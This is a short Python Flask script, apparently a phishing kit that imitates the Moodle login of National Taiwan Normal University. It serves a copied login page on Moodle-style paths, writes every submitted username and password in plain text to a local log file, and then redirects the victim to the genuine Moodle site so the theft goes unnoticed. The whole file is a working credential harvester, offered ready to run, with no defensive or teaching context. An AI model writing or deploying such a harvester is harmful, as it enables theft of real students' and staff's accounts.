from flask import Flask, request, redirect, send_from_directory, render_template_string

app = Flask(__name__)
@app.route('/', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'])
@app.route('/login/', methods=['GET', 'POST'])
@app.route('/login/index.php', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # 獲取用戶輸入的帳號和密碼
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # 將用戶輸入記錄到伺服器端 (可以改為記錄到文件)
        with open('user_input_log.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        
        # 重定向到 Moodle 網站
        return redirect("https://moodle3.ntnu.edu.tw/login/index.php")

    # 返回 index.html
    return send_from_directory('.', 'index.html')

if __name__ == '__main__':
    # debug must be fasle , or you can't run it in background
    app.run(host='0.0.0.0', port=7777,debug=False)
